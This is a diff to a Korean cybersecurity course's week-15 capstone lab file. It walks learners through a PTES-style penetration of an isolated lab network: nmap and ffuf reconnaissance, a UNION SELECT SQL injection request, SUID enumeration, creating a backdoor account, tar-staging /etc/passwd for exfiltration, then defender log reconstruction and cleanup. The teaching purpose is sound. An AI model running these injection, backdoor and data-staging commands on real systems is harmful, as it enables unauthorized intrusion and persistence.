@@ -6,7 +6,8 @@ week: 15
 description: |
   공격기법 수료 캡스톤. PTES 방법론으로 정찰→취약점분석→익스플로잇/셸→권한상승→persistence→유출의
   한 침투를 완주하고, 방어자가 전체 킬체인을 로그로 재구성한다. W01–W14 전 기법 종합. 전 흔적 self-clean.
-  인가된 실습만. 명령은 el34 호스트에서.
+  인가된 실습만. 명령은 el34 호스트(ssh ccc@192.168.0.151)에서 실행하며, 컨테이너 작업은
+  docker exec -it <컨테이너> bash 로 접속해 수행한다.
 difficulty: hard
 duration_minutes: 280
 prerequisites:
@@ -30,9 +31,12 @@ steps:
       시작 전 도구 가용성부터 확인한다.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 공격 도구 체인 점검 — 정찰(nmap/ffuf)·익스플로잇(sqlmap)이 attacker에 있는지
-      docker exec el34-attacker sh -c 'command -v nmap; command -v ffuf; command -v sqlmap; echo tools-ok'
+      command -v nmap; command -v ffuf; command -v sqlmap; echo tools-ok
       ```
 
       ## ✅ 합격 기준
@@ -70,11 +74,14 @@ steps:
       그린다(W01–W02). fw gateway 10.20.30.1 의 공개 vhost 를 Host 헤더로 노린다.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 포트 스캔 — fw gateway(10.20.30.1)의 80/443/8001 개방 포트 확인
-      docker exec el34-attacker nmap -p 80,443,8001 10.20.30.1 -T4 --max-retries 1 2>/dev/null | grep -E "open|PORT"
+      nmap -p 80,443,8001 10.20.30.1 -T4 --max-retries 1 2>/dev/null | grep -E "open|PORT"
       # 2) 경로 퍼징 — juice.el34.lab vhost에 admin/login/ftp 경로 탐색(ffuf)
-      docker exec el34-attacker sh -c 'printf "admin\nlogin\nftp\n" > /tmp/pt15.txt; ffuf -u http://10.20.30.1/FUZZ -w /tmp/pt15.txt -H "Host: juice.el34.lab" -mc 200,301,403 -s 2>&1 | head -5; rm -f /tmp/pt15.txt'
+      printf "admin\nlogin\nftp\n" > /tmp/pt15.txt; ffuf -u http://10.20.30.1/FUZZ -w /tmp/pt15.txt -H "Host: juice.el34.lab" -mc 200,301,403 -s 2>&1 | head -5; rm -f /tmp/pt15.txt
       ```
 
       ## ✅ 합격 기준
@@ -118,11 +125,14 @@ steps:
       침투 경로 정보다.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입(ModSec On이라 403 차단=탐지)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=pt15%27%20UNION%20SELECT%201--\""
+      curl -s -o /dev/null -w 'sqli=%{http_code} ' -A sqlmap/1.7 -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=pt15%27%20UNION%20SELECT%201--"
       # 2) 강제 브라우징 — juice.el34.lab /ftp 접근(DetectionOnly라 200 열림)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
+      curl -s -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp
       # 3) 해석 — SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200) = 익스플로잇 표면
       echo "→ SQLi(dvwa 403 탐지) + 강제 브라우징(/ftp 200). 익스플로잇 표면"
       ```
@@ -164,15 +174,18 @@ steps:
       방어자 도구 osquery listening_ports 로 그 포트를 확인한다(W08 패턴). 확인 후 즉시 정리.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 셸 거점 모사 — 백그라운드 리스너(포트 51515) 기동
-      docker exec el34-web sh -c 'nohup python3 -m http.server 51515 >/dev/null 2>&1 & echo shell'
+      nohup python3 -m http.server 51515 >/dev/null 2>&1 & echo shell
       # 2) 리스너가 뜰 시간 잠깐 확보
       sleep 1
       # 3) osquery listening_ports로 51515 리스너 확인(방어자 시점 가시화)
-      docker exec el34-web osqueryi --json 'SELECT pid,port FROM listening_ports WHERE port=51515;'
+      osqueryi --json 'SELECT pid,port FROM listening_ports WHERE port=51515;'
       # 4) 리스너 즉시 정리([h]ttp 자기매칭 회피) 후 셸 확보 표지
-      docker exec el34-web sh -c 'pkill -f "[h]ttp.server 51515" 2>/dev/null; true'
+      pkill -f "[h]ttp.server 51515" 2>/dev/null; true
       echo "shell captured 51515"
       ```
 
@@ -220,9 +233,12 @@ steps:
       캡스톤은 열거까지만(읽기전용), 실제 상승은 개념.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` 의 저권한 사용자 — `docker exec -it -u ccc el34-web bash` 로 접속해 실행한다(저권한 셸 모사).
+
       ```bash
       # 1) SUID 열거 — 저권한 ccc로 root 권한 실행 파일 목록 + 그룹 멤버십(id) 확인
-      docker exec -u ccc el34-web sh -c 'echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null | head -5; echo "[그룹]"; id'
+      echo "[SUID]"; find / -perm -4000 -type f 2>/dev/null | head -5; echo "[그룹]"; id
       # 2) 해석 — SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색
       echo "→ SUID/sudo 열거 → GTFObins 매핑(W11). root 경로 탐색"
       ```
@@ -269,11 +285,14 @@ steps:
       tar staging(유출 준비, W12 UEBA). 둘 다 미션 9 에서 self-clean.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
       ```bash
       # 1) persistence + staging — 백도어 계정 pt15ghost 생성 + 민감 파일 tar로 유출 준비
-      docker exec el34-web sh -c 'userdel -r pt15ghost 2>/dev/null; useradd -m -s /bin/bash pt15ghost; tar czf /tmp/pt15_exfil.tar.gz /etc/passwd /etc/hostname 2>/dev/null; echo "persist+exfil"'
+      userdel -r pt15ghost 2>/dev/null; useradd -m -s /bin/bash pt15ghost; tar czf /tmp/pt15_exfil.tar.gz /etc/passwd /etc/hostname 2>/dev/null; echo "persist+exfil"
       # 2) 발판 확인 — osquery users로 백도어 계정 pt15ghost 조회
-      docker exec el34-web osqueryi --json 'SELECT username,uid FROM users WHERE username="pt15ghost";'
+      osqueryi --json 'SELECT username,uid FROM users WHERE username="pt15ghost";'
       # 3) 해석 — 백도어 계정(W12) + 데이터 staging(W12 UEBA)
       echo "→ 백도어 계정(pt15ghost, W12) + 데이터 staging(exfil, W12 UEBA)"
       ```
@@ -318,11 +337,14 @@ steps:
       발판(osquery 계정)·유출(FIM). defense in depth 면 어느 한 단계만 끊어도 킬체인이 무너진다.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 정찰/침투 흔적 — WAF(modsec) 감사로그에서 발화한 CRS 룰 ID(9xxxx) 추출
-      echo "[정찰/침투 → WAF]"; docker exec el34-web sh -c 'sudo tail -120 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head'
+      echo "[정찰/침투 → WAF]"; sudo tail -120 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head
       # 2) 발판 흔적 — osquery users로 백도어 계정 pt15ghost 확인
-      echo "[발판 → osquery]"; docker exec el34-web osqueryi --json 'SELECT username FROM users WHERE username="pt15ghost";'
+      echo "[발판 → osquery]"; osqueryi --json 'SELECT username FROM users WHERE username="pt15ghost";'
       # 3) 해석 — 정찰(913)→침투(942)→발판(pt15ghost)→유출(staging) 킬체인
       echo "→ 정찰(913)→침투(942)→발판(pt15ghost)→유출(staging) 킬체인. 어느 단계서든 끊기"
       ```
@@ -430,9 +452,12 @@ steps:
       잔재가 없는지(user/shell/staging ok) 재점검한다.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 전 흔적 제거 + 잔재 재점검 — 계정(userdel)·staging(rm)·셸(pgrep) 각각 ok 확인
-      docker exec el34-web sh -c 'userdel -r pt15ghost 2>/dev/null; rm -f /tmp/pt15_exfil.tar.gz; id pt15ghost 2>/dev/null && echo "계정 잔재!" || echo "user ok"; pgrep -f "[h]ttp.server 51515" && echo "셸 잔재!" || echo "shell ok"; ls /tmp/pt15_exfil.tar.gz 2>/dev/null && echo "staging 잔재!" || echo "staging ok"'
+      userdel -r pt15ghost 2>/dev/null; rm -f /tmp/pt15_exfil.tar.gz; id pt15ghost 2>/dev/null && echo "계정 잔재!" || echo "user ok"; pgrep -f "[h]ttp.server 51515" && echo "셸 잔재!" || echo "shell ok"; ls /tmp/pt15_exfil.tar.gz 2>/dev/null && echo "staging 잔재!" || echo "staging ok"
       # 2) 정리 완료 표지
       echo "---check done---"
       ```
